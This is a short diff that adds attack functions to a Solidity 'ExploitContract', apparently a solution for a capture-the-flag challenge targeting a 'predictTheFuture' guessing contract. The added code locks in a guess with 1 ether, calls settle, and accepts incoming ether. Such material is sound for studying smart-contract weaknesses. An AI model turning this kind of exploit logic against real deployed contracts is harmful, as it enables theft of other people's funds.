@@ -54,4 +54,14 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    function attackGuess() external payable {
+        predictTheFuture.lockInGuess{value: 1 ether}(uint8(0));
+    }
+
+    function attackSettle() external {
+        predictTheFuture.settle();
+    }
+
+    receive() external payable {}
+    fallback() external payable {}
 }
